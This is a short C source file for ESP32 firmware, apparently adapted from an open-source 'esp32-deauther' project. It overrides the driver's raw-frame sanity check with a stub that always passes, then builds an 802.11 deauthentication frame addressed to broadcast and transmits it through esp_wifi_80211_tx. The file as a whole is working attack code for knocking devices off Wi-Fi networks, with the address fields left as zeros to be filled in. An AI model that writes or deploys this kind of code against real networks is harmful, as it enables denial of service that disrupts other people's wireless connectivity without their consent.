// Inspired by: https://github.com/GANESH-ICMC/esp32-deauther

#include "deauther.h"

#include <stdint.h>
#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

static const char *TAG = "deauther";
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
};

void deauther_send_deauth_frame(){
    ESP_LOGD(TAG, "Sending deauth frame...");
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    for(unsigned i = 0; i < sizeof(deauth_frame_default); i++){
        deauth_frame[i] = deauth_frame_default[i];
    }
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false));
}